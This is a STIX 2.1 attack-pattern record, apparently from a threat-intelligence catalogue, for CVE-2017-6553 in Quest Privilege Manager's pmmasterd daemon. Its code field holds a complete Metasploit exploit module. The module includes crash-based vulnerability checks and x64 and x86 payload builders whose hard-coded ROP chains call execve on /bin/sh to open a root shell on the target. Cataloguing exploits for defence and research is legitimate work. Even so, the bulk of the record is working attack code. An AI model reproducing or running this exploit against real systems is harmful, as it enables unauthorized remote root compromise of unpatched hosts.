{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--439df35c-8233-4234-8973-9ecc37d48c06",
    "created": "2024-08-14T16:57:44.296159Z",
    "modified": "2024-08-14T16:57:44.296162Z",
    "name": "Quest Privilege Manager pmmasterd Buffer Overflow",
    "description": " This modules exploits a buffer overflow in the Quest Privilege Manager a software used to integrate Active Directory with Linux and Unix systems. The vulnerability exists in the pmmasterd daemon, and can only triggered when the host has been configured as a policy server ( Privilege Manager for Unix or Quest Sudo Plugin). A buffer overflow condition exists when handling requests of type ACT_ALERT_EVENT, where the size of a memcpy can be controlled by the attacker. This module only works against version < 6.0.0-27. Versions up to 6.0.0-50 are also vulnerable, but not supported by this module (a stack cookie bypass is required). NOTE: To use this module it is required to be able to bind a privileged port ( <=1024 ) as the server refuses connections coming from unprivileged ports, which in most situations means that root privileges are required. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/quest_pmmasterd_bof.rb",
            "external_id": "quest_pmmasterd_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6553"
        },
        {
            "source_name": "reference",
            "url": "https://0xdeadface.wordpress.com/2017/04/07/multiple-vulnerabilities-in-quest-privilege-manager-6-0-0-xx-cve-2017-6553-cve-2017-6554/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Quest Privilege Manager pmmasterd Buffer Overflow',\n      'Description'    => %q{\n        This modules exploits a buffer overflow in the Quest Privilege Manager,\n        a software used to integrate Active Directory with Linux and Unix\n        systems. The vulnerability exists in the pmmasterd daemon, and can only\n        triggered when the host has been configured as a policy server (\n        Privilege Manager for Unix or Quest Sudo Plugin). A buffer overflow\n        condition exists when handling requests of type ACT_ALERT_EVENT, where\n        the size of a memcpy can be controlled by the attacker. This module\n        only works against version < 6.0.0-27. Versions up to 6.0.0-50 are also\n        vulnerable, but not supported by this module (a stack cookie bypass is\n        required). NOTE: To use this module it is required to be able to bind a\n        privileged port ( <=1024 ) as the server refuses connections coming\n        from unprivileged ports, which in most situations means that root\n        privileges are required.\n      },\n      'Author'         =>\n        [\n          'm0t'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-6553'],\n          ['URL', 'https://0xdeadface.wordpress.com/2017/04/07/multiple-vulnerabilities-in-quest-privilege-manager-6-0-0-xx-cve-2017-6553-cve-2017-6554/']\n        ],\n      'Payload'        =>\n        {\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd_interact',\n              'ConnectionType' => 'find'\n            }\n        },\n      'Arch'           => ARCH_CMD,\n      'Platform'       => 'unix',\n      'Targets'        =>\n        [\n          ['Quest Privilege Manager pmmasterd 6.0.0-27 x64',\n            {\n              exploit: :exploit_x64,\n              check: :check_x64\n            }\n          ],\n          ['Quest Privilege Manager pmmasterd 6.0.0-27 x86',\n            {\n              exploit: :exploit_x86,\n              check: :check_x86\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-04-09',\n      'DefaultTarget'  => 0\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(12345),\n        Opt::CPORT(rand(1024))\n      ]\n    )\n  end\n\n  # definitely not stealthy! sends a crashing request, if the socket dies, or\n  # the output is partial it assumes the target has crashed. Although the\n  # daemon spawns a new process for each connection, the segfault will appear\n  # on syslog\n  def check\n    unless respond_to?(target[:check], true)\n      fail_with(Failure::NoTarget, \"Invalid target specified\")\n    end\n\n    send(target[:check])\n  end\n\n  def exploit\n    unless respond_to?(target[:exploit], true)\n      fail_with(Failure::NoTarget, \"Invalid target specified\")\n    end\n\n    request = send(target[:exploit])\n\n    connect\n    print_status(\"Sending trigger\")\n    sock.put(request)\n    sock.get_once\n    handler(sock)\n    disconnect\n  end\n\n  # server should crash after parsing the packet, partial output is returned\n  def check_x64\n    head = [ 0x26c ].pack(\"N\")\n    head << [ 0x700 ].pack(\"N\")\n    head << [ 0x700 ].pack(\"N\")\n    head << \"\\x00\" * 68\n\n    body = \"PingE4.6 .0.0.27\"\n    body << rand_text_alpha(3000)\n\n    request = head + body\n\n    connect\n    print_status(\"Sending trigger\")\n    sock.put(request)\n    res = sock.timed_read(1024, 1)\n    if res.match? \"Pong4$\"\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  # server should crash while parsing the packet, with no output\n  def check_x86\n    head = [ 0x26c ].pack(\"N\")\n    head << [ 0x700 ].pack(\"N\")\n    head << [ 0x700 ].pack(\"N\")\n    head << \"\\x00\" * 68\n\n    body = rand_text_alpha(3000)\n\n    request = head + body\n\n    connect\n    print_status(\"Sending trigger\")\n    sock.put(request)\n    begin\n      sock.timed_read(1024, 1)\n      return Exploit::CheckCode::Unknown\n    rescue ::Exception\n      return Exploit::CheckCode::Appears\n    end\n  end\n\n  def exploit_x64\n    head = [ 0x26c ].pack(\"N\")\n    head << [ 0x700 ].pack(\"N\")\n    head << [ 0x700 ].pack(\"N\")\n    head << \"\\x00\" * 68\n\n    # rop chain for pmmasterd 6.0.0.27 (which is compiled without -fPIE)\n    ropchain = [\n      0x408f88,   # pop rdi, ret\n      0x4FA215,   # /bin/sh\n      0x40a99e,   # pop rsi ; ret\n      0,          # argv  @rsi\n      0x40c1a0,   # pop rax, ret\n      0,          # envp @rax\n      0x48c751,   # mov rdx, rax ; pop rbx ; mov rax, rdx ; ret\n      0xcacc013,  # padding\n      0x408a98,   # execve,\n      0\n    ].pack(\"Q*\")\n\n    body = \"PingE4.6 .0.0.27\" # this works if encryption is set to AES, which is default, changing E4 to E2 might make it work with DES\n    body << rand_text_alpha(1600)\n    body << ropchain\n    body << rand_text_alpha(0x700 - body.size)\n\n    head + body\n  end\n\n  def exploit_x86\n    head = [ 0x26c ].pack(\"N\")\n    head << [ 0x108 ].pack(\"N\")\n    head << [ 0xcc ].pack(\"N\")\n    head << \"\\x00\" * 68\n\n    # rop chain for pmmasterd 6.0.0.27 (which is compiled without -fPIE)\n    ropchain = [\n      0x8093262,  # ret\n      0x73,       # cs reg\n      0x804AE2C,  # execve,\n      0xcacc013,  # padding\n      0x8136CF0,  # /bin/sh\n      0,\n      0\n    ].pack(\"V*\")\n\n    pivotback = 0x08141223  # sub esp, ebx ; retf\n    writable = 0x81766f8    # writable loc\n\n    body = \"PingE4.6 .0.0.27\" # this works if encryption is set to AES, which is default, changing E4 to E2 might make it work with DES\n    body << rand_text_alpha(104)\n    body << ropchain\n    body << rand_text_alpha(0xb4 - body.size)\n    body << [0x50].pack(\"V\")\n    body << rand_text_alpha(0xc4 - body.size)\n    body << [pivotback].pack(\"V\")\n    body << [writable].pack(\"V\")\n    body << rand_text_alpha(0x108 - body.size)\n\n    head + body\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}